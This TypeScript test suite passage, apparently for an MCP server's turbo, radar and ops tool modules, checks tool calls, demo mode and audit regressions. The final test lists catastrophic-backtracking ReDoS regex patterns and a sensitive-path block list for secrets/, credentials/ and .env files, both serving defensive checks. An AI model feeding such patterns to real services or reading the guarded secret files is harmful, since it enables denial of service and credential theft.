        });
        assert.equal(searchCall.isError, undefined);
        assert.equal((searchCall.structuredContent as { totalMatches: number }).totalMatches, 1);

        const outlineCall = await client.callTool({
          name: 'turbo_read_outline',
          arguments: { filePath: 'src/app.ts' },
        });
        assert.equal(outlineCall.isError, undefined);
        assert.equal((outlineCall.structuredContent as { outline: unknown[] }).outline.length, 1);

        const compactCall = await client.callTool({
          name: 'turbo_compact_output',
          arguments: { label: 'build', rawText: 'ok\nERROR boom at line 2\ndone' },
        });
        const chunkId = (compactCall.structuredContent as { chunkId: string }).chunkId;
        assert.ok(chunkId);

        const queryChunkCall = await client.callTool({
          name: 'app_turbo_query_chunk',
          arguments: { chunkId, query: 'boom' },
        });
        assert.equal((queryChunkCall.structuredContent as { totalHits: number }).totalHits, 1);

        const radarCall = await client.callTool({ name: 'radar_get_board', arguments: {} });
        assert.equal((radarCall.structuredContent as { counts: { total: number } }).counts.total, 0);

        const listPromptsCall = await client.callTool({ name: 'ops_list_prompts', arguments: {} });
        assert.equal((listPromptsCall.structuredContent as { count: number }).count, 5);

        const renderCall = await client.callTool({
          name: 'ops_render_prompt',
          arguments: { id: 'builtin-code-review', variables: { scope: 'src/modules/turbo' } },
        });
        assert.match(
          (renderCall.structuredContent as { rendered: string }).rendered,
          /src\/modules\/turbo/,
        );

        const auditCall = await client.callTool({ name: 'ops_audit_workspace', arguments: {} });
        assert.ok((auditCall.structuredContent as { summary: { assetCount: number } }).summary.assetCount >= 1);

        // Still zero disk writes after pure read-only tool calls!
        assert.equal(fs.existsSync(dataDir), false);

        // Verify dynamic .disable() and .enable() on all 3 modules
        for (const h of [...turboReg.modelTools, ...radarReg.modelTools, ...opsReg.modelTools]) {
          h.disable();
        }
        const afterDisable = await client.listTools();
        const disabledSet = new Set(afterDisable.tools.map((t) => t.name));
        for (const id of ['turbo', 'radar', 'ops'] as const) {
          for (const toolName of MODULE_CATALOG[id].modelToolNames) {
            assert.equal(disabledSet.has(toolName), false, `${toolName} should be disabled`);
          }
        }

        for (const h of [...turboReg.modelTools, ...radarReg.modelTools, ...opsReg.modelTools]) {
          h.enable();
        }
        const afterEnable = await client.listTools();
        const enabledSet = new Set(afterEnable.tools.map((t) => t.name));
        for (const id of ['turbo', 'radar', 'ops'] as const) {
          for (const toolName of MODULE_CATALOG[id].modelToolNames) {
            assert.equal(enabledSet.has(toolName), true, `${toolName} should be re-enabled`);
          }
        }
      } finally {
        await client.close();
        await server.close();
      }
    });
  });

  it('supports demoMode across turbo, radar, and ops with rich synthetic data and zero disk writes', async () => {
    await withTempDir('agy-nov-v02-demo-', async (tmpDir) => {
      const dataDir = path.join(tmpDir, 'demo-data-absent');
      const server = new McpServer(
        { name: 'agy-nov-v02-demo', version: '0.2.0' },
        { capabilities: { tools: { listChanged: true } } },
      );

      const opts = { dataDir, workspaceRoot: tmpDir, demoMode: true };
      registerTurboModule(server, opts, 'ui://agy-nov/app.html');
      registerRadarModule(server, opts, 'ui://agy-nov/app.html');
      registerOpsModule(server, opts, 'ui://agy-nov/app.html');

      assert.equal(fs.existsSync(dataDir), false);

      const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
      const client = new Client({ name: 'v02-demo-client', version: '0.2.0' });
      await server.connect(serverTransport);
      await client.connect(clientTransport);

      try {
        const turboState = await client.callTool({ name: 'app_turbo_get_state', arguments: {} });
        const tData = turboState.structuredContent as { mode: string; chunks: unknown[]; stats: { estimatedSavedTokens: number } };
        assert.equal(tData.mode, 'demo');
        assert.ok(tData.chunks.length >= 2);
        assert.ok(tData.stats.estimatedSavedTokens > 0);

        const radarState = await client.callTool({ name: 'app_radar_get_board', arguments: {} });
        const rData = radarState.structuredContent as {
          mode: string;
          counts: { running: number; awaiting_approval: number; completed: number; stalled: number };
        };
        assert.equal(rData.mode, 'demo');
        assert.equal(rData.counts.running, 1);
        assert.equal(rData.counts.awaiting_approval, 1);
        assert.equal(rData.counts.completed, 1);
        assert.equal(rData.counts.stalled, 1);

        const opsState = await client.callTool({ name: 'app_ops_get_state', arguments: {} });
        const oData = opsState.structuredContent as { mode: string; promptCount: number; audit: { mode: string } };
        assert.equal(oData.mode, 'demo');
        assert.equal(oData.promptCount, 6);
        assert.equal(oData.audit.mode, 'demo');

        // Demo mode interactions also leave disk untouched
        await client.callTool({ name: 'app_radar_ack_session', arguments: {} });
        await client.callTool({
          name: 'app_ops_save_prompt',
          arguments: { title: 'Demo Temp', body: 'Hello {{name}}' },
        });
        assert.equal(fs.existsSync(dataDir), false);
      } finally {
        await client.close();
        await server.close();
      }
    });
  });

  it('audit regressions: blocks unparenthesized ReDoS patterns and nested sensitive subdirectories', async () => {
    await withTempDir('agy-nov-v02-audit-reg-', (tmpDir) => {
      fs.mkdirSync(path.join(tmpDir, 'secrets', 'sub'), { recursive: true });
      fs.mkdirSync(path.join(tmpDir, 'credentials'), { recursive: true });
      fs.mkdirSync(path.join(tmpDir, 'src'), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, 'secrets', 'api.txt'), 'TOP_SECRET_TOKEN=abc123\n');
      fs.writeFileSync(path.join(tmpDir, 'secrets', 'sub', 'key.txt'), 'NESTED_SECRET=xyz\n');
      fs.writeFileSync(path.join(tmpDir, 'credentials', 'prod.json'), '{"api":"hidden"}\n');
      fs.writeFileSync(path.join(tmpDir, 'src', 'safe.ts'), `${'a'.repeat(32)}!\n`);

      // High-1 & R2-1: unparenthesized and bounded-range brace quantifiers must fall back to literal immediately
      for (const dangerous of [
        'a*a*a*a*a*a*a*a*a*a*b',
        'a+a+a+a+a+a+a+a+a+a+b',
        '.*a.*a.*a.*b',
        '\\w+\\w+\\w+\\w+!',
        'a{1,50}a{1,50}a{1,50}a{1,50}b',
        'a{100}',
      ]) {
        assert.equal(isPotentiallyUnsafeRegex(dangerous), true, `Expected unsafe regex: ${dangerous}`);
      }

      const t0 = Date.now();
      const searchRes = batchSearchWorkspace(
        tmpDir,
        ['a*a*a*a*a*a*a*a*a*a*b', 'a{1,50}a{1,50}a{1,50}a{1,50}b', 'TOP_SECRET_TOKEN'],
        { regex: true },
      );
      assert.ok(Date.now() - t0 < 500, 'ReDoS fallback search must complete quickly');
      assert.equal(searchRes.results[0]?.mode, 'literal');
      assert.equal(searchRes.results[0]?.fallbackLiteral, true);
      assert.equal(searchRes.results[1]?.mode, 'literal');
      assert.equal(searchRes.results[1]?.fallbackLiteral, true);
      // High-2: files inside secrets/ or credentials/ must not be searched or outlined
      assert.equal(searchRes.results[2]?.totalHits, 0);
      assert.ok(searchRes.skippedSensitive >= 2);
      assert.equal(isSensitiveTurboPath('secrets/api.txt'), true);
      assert.equal(isSensitiveTurboPath('credentials/prod.json'), true);
      assert.equal(isSensitiveTurboPath('.env.d/local'), true);
      assert.equal(isSensitiveOpsPath('secrets/api.txt'), true);
      assert.equal(isSensitiveOpsPath('credentials/prod.json'), true);
      assert.throws(() => readFileOutlineAndSlice(tmpDir, 'secrets/api.txt'), /sensitive/i);
      assert.throws(
        () => batchSearchWorkspace(tmpDir, ['NESTED_SECRET'], { directory: 'secrets/sub' }),
        /sensitive/i,
      );

      // R2-2: legitimate workspace whose ancestor directory name contains "secret" must not be false-positived
      const secretNamedRoot = path.join(tmpDir, 'my-secret-project');
      fs.mkdirSync(secretNamedRoot, { recursive: true });
      fs.writeFileSync(path.join(secretNamedRoot, 'AGENTS.md'), '# Project Rules\n');
      fs.writeFileSync(path.join(secretNamedRoot, 'plugin.json'), '{"name":"demo"}\n');
      const auditRes = auditWorkspaceAssets(secretNamedRoot, path.join(tmpDir, 'audit-data'));
      assert.equal(auditRes.summary.assetCount, 2);
      assert.equal(auditRes.summary.skippedSensitive, 0);
      const snapRes = buildWorkspaceSnapshot(secretNamedRoot);
      assert.ok(snapRes.markdown.includes('AGENTS.md'));
    });
  });
});
